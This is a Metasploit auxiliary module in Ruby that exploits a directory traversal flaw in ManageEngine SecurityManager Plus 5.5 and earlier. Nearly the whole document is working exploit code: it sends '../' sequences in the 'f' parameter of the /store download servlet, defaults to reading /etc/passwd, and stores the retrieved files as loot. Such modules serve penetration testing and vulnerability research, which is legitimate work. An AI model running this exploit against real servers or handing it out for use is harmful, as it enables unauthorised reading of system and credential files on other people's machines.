##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ManageEngine SecurityManager Plus 5.5 Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal flaw found in ManageEngine
        SecurityManager Plus 5.5 or less.  When handling a file download request,
        the DownloadServlet class fails to properly check the 'f' parameter, which
        can be abused to read any file outside the virtual directory.
      },
      'References'     =>
        [
          ['OSVDB', '86563'],
          ['EDB', '22092']
        ],
      'Author'         =>
        [
          'blkhtc0rp',  #Original
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Oct 19 2012"
    ))

    register_options(
      [
        OptPort.new('RPORT',       [true, 'The target port', 6262]),
        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),
        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
      ], self.class)
  end


  def run_host(ip)
    base = normalize_uri(target_uri.path)
    base << '/' if base[-1,1] != '/'

    peer = "#{ip}:#{rport}"
    fname = datastore['FILE']

    print_status("#{peer} - Reading '#{datastore['FILE']}'")
    traverse = "../" * datastore['DEPTH']
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => "#{base}store",
      'vars_get' => {
        'f' => "#{traverse}#{datastore['FILE']}"
      }
    })


    if res and res.code == 500 and res.body =~ /Error report/
      print_error("#{peer} - Cannot obtain '#{fname}', here are some possible reasons:")
      print_error("\t1. File does not exist.")
      print_error("\t2. The server does not have any patches deployed.")
      print_error("\t3. Your 'DEPTH' option isn't deep enough.")
      print_error("\t4. Some kind of permission issues.")

    elsif res and res.code == 200
      data = res.body
      p = store_loot(
        'manageengine.securitymanager',
        'application/octet-stream',
        ip,
        data,
        fname
      )

      vprint_line(data)
      print_good("#{peer} - #{fname} stored as '#{p}'")

    else
      print_error("#{peer} - Fail to obtain file for some unknown reason")
    end
  end

end
